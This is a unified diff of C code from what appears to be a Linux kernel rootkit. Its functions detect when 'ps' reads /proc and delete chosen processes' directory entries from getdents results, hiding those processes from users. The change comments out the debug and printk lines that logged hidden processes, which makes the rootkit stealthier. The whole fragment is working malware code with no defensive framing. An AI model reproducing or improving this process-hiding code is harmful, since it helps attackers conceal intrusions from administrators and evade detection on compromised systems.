@@ -192,7 +192,7 @@ int is_command_ps(unsigned int fd)
     if (fd_inode->i_ino == PROC_ROOT_INO && imajor(fd_inode) == 0 
         && iminor(fd_inode) == 0)
     {
-        DEBUG("User typed command ps");
+        // DEBUG("User typed command ps");
         return 1;
     }
     return 0;
@@ -253,7 +253,7 @@ long hide_processes(struct linux_dirent *dirp, long getdents_ret)
         proc_name = get_task_comm(proc_name, proc_task);
         if (is_hidden_process(proc_name)) {
             // Hide the process by deleting its dirent: shift all its right dirents to left.
-            printk("Hide process: %s\n", proc_task->comm);
+            // printk("Hide process: %s\n", proc_task->comm);
             next_dirent = (struct linux_dirent *)((char *)cur_dirent + cur_dirent->d_reclen);
             memcpy(cur_dirent, next_dirent, getdents_ret - dent_offset - cur_dirent->d_reclen);
             getdents_ret -= cur_dirent->d_reclen;
